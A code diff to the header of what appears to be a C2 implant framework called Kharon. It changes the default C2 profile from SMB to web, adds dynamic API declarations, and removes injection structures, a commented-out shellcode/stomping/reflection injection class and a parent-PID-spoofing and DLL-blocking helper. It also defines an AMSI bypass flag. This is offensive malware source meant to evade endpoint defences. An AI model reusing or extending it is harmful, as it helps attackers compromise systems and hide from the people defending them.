@@ -85,7 +85,7 @@ EXTERN_C UPTR EndPtr();
 #define KH_BYPASS_AMSI 0x700
 
 #ifndef PROFILE_C2
-#define PROFILE_C2 PROFILE_SMB
+#define PROFILE_C2 PROFILE_WEB
 #endif 
 
 #ifndef KH_HARDWARE_BREAKPOINT_BYPASS_DOTNET
@@ -379,9 +379,11 @@ namespace Root {
         struct {
             UPTR Handle;
 
+            DECLAPI( printf );
             DECLAPI( vprintf );
             DECLAPI( vsnprintf );
         } Msvcrt = {
+            RSL_TYPE( printf ),
             RSL_TYPE( vprintf ),
             RSL_TYPE( vsnprintf ),
         };
@@ -440,6 +442,7 @@ namespace Root {
             DECLAPI( FindFirstFileA );
             DECLAPI( FindNextFileA );
             DECLAPI( FindClose );
+            DECLAPI( SetFileInformationByHandle );
         
             DECLAPI( CreateProcessA );
             DECLAPI( OpenProcess );
@@ -546,6 +549,7 @@ namespace Root {
             RSL_TYPE( FindFirstFileA ),
             RSL_TYPE( FindNextFileA ),
             RSL_TYPE( FindClose ),
+            RSL_TYPE( SetFileInformationByHandle ),
         
             RSL_TYPE( CreateProcessA ),
             RSL_TYPE( OpenProcess ),
@@ -2342,131 +2346,5 @@ public:
         _In_ ULONG Time
     ) -> BOOL;
 };
-
-#define KH_INJ_HIBERNING 0x200
-#define KH_INJ_RUNNING   0x100
-
-typedef struct _INJECTION_NODE {
-    ULONG ID;
-    PVOID Address;
-    ULONG Length;
-    ULONG State;
-    BOOL  Obfuscated;
-    PVOID Output;
-    ULONG OutLength;
-    struct _INJECTION_NODE* Next;
-} INJECTION_NODE, *PINJECTION_NODE;
-
-// class Injection {
-// private:
-//     Root::Kharon* Self;
-// public:
-//     Injection( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
-
-//     PINJECTION_NODE Node = nullptr;
-
-//     struct {
-//         struct {
-//             UINT8 TechniqueID;
-//         } PE;
-
-//         struct {
-//             UINT8 TechniqueID;
-//         } Sc; 
-
-//         struct {
-//             BOOL  b;
-//             ULONG s;
-//             PVOID p;
-//         } Pipe;
-
-//         struct {
-//             ULONG s;
-//             BYTE* p;
-//         } Param;
-        
-//         BOOL Spawn;
-
-//     } Ctx = {
-//         .PE = { .TechniqueID = PeReflection },
-//         .Sc = { .TechniqueID = KH_INJECTION_SC }
-//     };
-
-//     auto Shellcode(
-//         _In_ ULONG ProcessID,
-//         _In_ BYTE* Buffer,
-//         _In_ UPTR  Size,
-//         _In_ PVOID Param
-//     ) -> BOOL;
-
-//     auto Classic(
-//         _In_  ULONG  ProcessID,
-//         _In_  BYTE*  Buffer,
-//         _In_  UPTR   Size,
-//         _In_  PVOID  Param,
-//         _Out_ PVOID &Base
-//     ) -> BOOL;
-
-//     auto Stomp(
-//         _In_  ULONG ProcessID,
-//         _In_  BYTE* Buffer,
-//         _In_  UPTR  Size,
-//         _In_  PVOID Param,
-//         _Out_ PVOID &Base
-//     ) -> BOOL;
-
-//     auto Reflection(
-//         _In_ BYTE*  Buffer,
-//         _In_ ULONG  Size,
-//         _In_ PVOID  Param
-//     ) -> BOOL;
-// };
-
-class ProcThreadAttrList: public Root::Kharon {
-private:
-    LPPROC_THREAD_ATTRIBUTE_LIST AttrBuff;
-    UPTR                         AttrSize;
-
-public:
-    DECLFN ProcThreadAttrList() : AttrBuff( 0 ), AttrSize( 0 ) {}
-
-    __forceinline auto DECLFN Initialize(
-        _In_ UINT8 UpdateCount
-    ) -> BOOL {
-        INT3BRK
-        Krnl32.InitializeProcThreadAttributeList( 0, UpdateCount, 0, &AttrSize );
-        AttrBuff = (LPPROC_THREAD_ATTRIBUTE_LIST)Ntdll.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, AttrSize );
-
-        return Krnl32.InitializeProcThreadAttributeList( AttrBuff, UpdateCount, 0, &AttrSize );
-    }
-
-    auto DECLFN UpdateParentSpf(
-        _In_ HANDLE ParentHandle
-    ) -> BOOL {
-        return Krnl32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ParentHandle, sizeof( HANDLE ), 0, 0 );
-    }
-
-    auto DECLFN UpdateBlockDlls(
-        VOID
-    ) -> BOOL {
-        UINT64 Policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
-        return Krnl32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &Policy, sizeof( Policy ), 0, 0 );
-    }
-
-    inline DECLFN ~ProcThreadAttrList(
-        VOID
-    ) {
-        if ( AttrBuff ) {
-            Mem::Zero( U_PTR( AttrBuff ), AttrSize );
-            Ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, PTR( AttrBuff ) );
-            Krnl32.DeleteProcThreadAttributeList( AttrBuff );
-        }
-    }
-
-    DECLFN LPPROC_THREAD_ATTRIBUTE_LIST GetAttrBuff() const { return AttrBuff; }
-};
-
-EXTERN_C void* __cdecl memset(void*, int, size_t);
-EXTERN_C VOID volatile ___chkstk_ms( VOID );
 
 #endif // KHARON_H
